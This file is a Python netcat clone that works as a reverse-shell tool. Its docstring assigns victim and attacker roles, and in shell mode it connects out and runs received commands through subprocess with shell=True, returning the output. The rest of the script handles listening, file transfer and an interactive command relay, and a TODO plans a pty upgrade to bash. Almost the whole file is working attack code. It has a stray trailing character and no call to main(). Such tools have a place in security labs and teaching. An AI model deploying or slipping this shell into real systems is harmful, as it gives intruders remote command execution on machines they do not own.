#!/usr/bin/env python3
""" 
   Written by:      h4n0sh1
   Date:            01/02/2021

   Features:        Dumb Remote code execution (no interactive) 
                    File I/O w/o preprocessing
                    Follows the logic of ncat
   
   TODO:            Make it upgradable with pty.spawn("/bin/bash")
                    Debug big buffers (e.g : cat file of size > 4096B)
                    Remove verbosity when piping > to a file 
                    Make positional argument TARGET_IP optional
                    (so to not type localhost when listening as in nc)
    
   Example: @vic    nc.py -lp 1234 localhost
            @atk    nc.py -sp 1234 TARGET_IP
"""
import socket
import sys
import threading 
import subprocess
import argparse
import traceback
import select

def menu():
    parser = argparse.ArgumentParser(description="nc.py")
    parser.add_argument('target', default='localhost', metavar='TARGET_IP')
    parser.add_argument('-p', '--port', type=int, dest='port', metavar='TARGET_PORT')
    parser.add_argument('-l', '--listen', action='store_true')
    parser.add_argument('-s', '--shell', action='store_true', help='shell')
    return parser.parse_args()

def main():
    global args
    global target  
    global port
    global listen
    global shell

    args = menu()
    target = args.target
    port = args.port
    listen = args.listen
    shell = args.shell
      
    if not listen:
        buffer = ""
        # Only read stdin if it's not empty (non blocking)
        if(select.select([sys.stdin,],[],[],0.0)[0]):
            buffer = sys.stdin.read()
        client_send(buffer)
    else:
        server_listen()
        
def client_send(buffer):
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((target, port))

    if shell: 
        while True:
            # Send a shell
            client_socket.send(b"[nc]$ ")
            buffer = b""
            recv_len = 1
            while 1:
                recv = client_socket.recv(4096)
                buffer += recv
                recv_len = len(recv)
                if(recv_len<4096):
                    break
            try:
                print("buffer", buffer.decode().rstrip())
                response = subprocess.check_output(
                        buffer.decode().rstrip(),
                        stderr=subprocess.STDOUT,
                        shell=True
                        )
            except:
                response = b"Exception in command processing ..."
            # Dirty way to deal with empty responses (e.g : cd)
            if not response:
                response=b"null"
            client_socket.send(response)
            if client_socket.recv(4096):
                continue

    else:
        # Send a file
        client_socket.send(buffer.encode())


def server_listen():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((target,port))
    server_socket.listen(5)
    print(f"[*] Listening on {target, port}")
    while True:
        client_socket, addr = server_socket.accept()
        print(f"[*] Accepted connection from {addr[0], addr[1]}")
        client_thread = threading.Thread(target=client_handler,
                                         args=(client_socket,))
        client_thread.start()

def client_handler(client_socket):
    try:
        while 1:
            data = client_socket.recv(4096)
            buffer = '' 
            if "[nc]$" not in data.decode():
                # Consider it's a file transfer
                buffer += data.decode()
                while True:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    else:
                        buffer += data.decode()
                print(buffer, end='') 
                # File parsed entirely
                client_socket.close()
                break
            else:
                # Send commands
                response = data.decode()
                recv_len = 1
                print(response, end='')
                buffer = input("")
                client_socket.send(buffer.encode())
                response = ''
                while recv_len:
                   data = client_socket.recv(4096)
                   recv_len = len(data)
                   response += data.decode()
                   if recv_len < 4096:
                       break
                client_socket.send(b"ACK")
                if "null" not in response:
                    print(response.rstrip())
    except :
        traceback.print_exc(limit=2, file=sys.stdout)
        print("[!] Exception occured ... ")

m
